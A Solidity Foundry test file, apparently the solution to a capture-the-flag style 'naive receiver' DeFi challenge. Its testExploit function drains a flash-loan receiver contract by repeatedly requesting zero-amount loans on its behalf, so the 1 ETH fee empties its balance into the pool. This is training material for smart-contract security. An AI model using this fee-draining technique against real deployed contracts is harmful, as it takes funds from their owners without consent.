// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {FlashLoanReceiver} from "../../../src/Contracts/naive-receiver/FlashLoanReceiver.sol";
import {NaiveReceiverLenderPool} from "../../../src/Contracts/naive-receiver/NaiveReceiverLenderPool.sol";

contract NaiveReceiver is Test {
    uint256 internal constant ETHER_IN_POOL = 1_000e18;
    uint256 internal constant ETHER_IN_RECEIVER = 10e18;

    Utilities internal utils;
    NaiveReceiverLenderPool internal pool;
    FlashLoanReceiver internal flashLoanReceiver;
    address payable internal owner;
    address payable internal user;
    address payable internal player;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(3);
        owner = users[0];
        player = users[1];
        user = users[2];

        vm.label(owner, "Owner");
        vm.label(user, "User");
        vm.label(player, "Player");

        vm.startPrank(owner);

        pool = new NaiveReceiverLenderPool();
        vm.label(address(pool), "Naive Receiver Lender Pool");
        flashLoanReceiver = new FlashLoanReceiver(
            payable(pool)
        );
        vm.label(address(flashLoanReceiver), "Flash Loan Receiver");

        vm.deal(address(pool), ETHER_IN_POOL);
        address ETH = pool.ETH();

        assertEq(address(pool).balance, ETHER_IN_POOL);
        assertEq(pool.maxFlashLoan(ETH), ETHER_IN_POOL);
        assertEq(pool.flashFee(ETH, 0), 1 ether);

        vm.deal(address(flashLoanReceiver), ETHER_IN_RECEIVER);
        vm.expectRevert(0x48f5c3ed);
        flashLoanReceiver.onFlashLoan(owner, ETH, ETHER_IN_RECEIVER, 1 ether, "0x");
        assertEq(address(flashLoanReceiver).balance, ETHER_IN_RECEIVER);

        vm.stopPrank();

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */

        vm.startPrank(player);
        while(address(flashLoanReceiver).balance > 0) {
            pool.flashLoan(flashLoanReceiver, pool.ETH(), 0, "");
        }
        vm.stopPrank();

        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        // All ETH has been drained from the receiver
        assertEq(address(flashLoanReceiver).balance, 0);
        assertEq(address(pool).balance, ETHER_IN_POOL + ETHER_IN_RECEIVER);
    }
}
